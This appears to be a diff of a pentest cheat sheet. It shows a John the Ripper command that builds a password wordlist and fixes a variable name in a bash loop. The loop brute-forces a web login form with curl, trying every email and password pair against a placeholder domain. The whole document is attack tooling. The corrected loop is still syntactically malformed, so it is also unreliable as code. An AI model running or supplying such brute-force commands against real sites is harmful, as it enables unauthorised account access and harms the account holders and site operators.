@@ -20,5 +20,5 @@ john --rules=all --stdout --wordlist=nomes.txt > passwords.txt
 ```
 ### Brute Force - Login
 ```
-for email in `cat emails.txt`; for b in `cat passwords.txt`; do curl -X POST --data "email=$email&password=$password" "https://domain.com.br/login" -s; done
+for email in `cat emails.txt`; for password in `cat passwords.txt`; do curl -X POST --data "email=$email&password=$password" "https://domain.com.br/login" -s; done
 ```
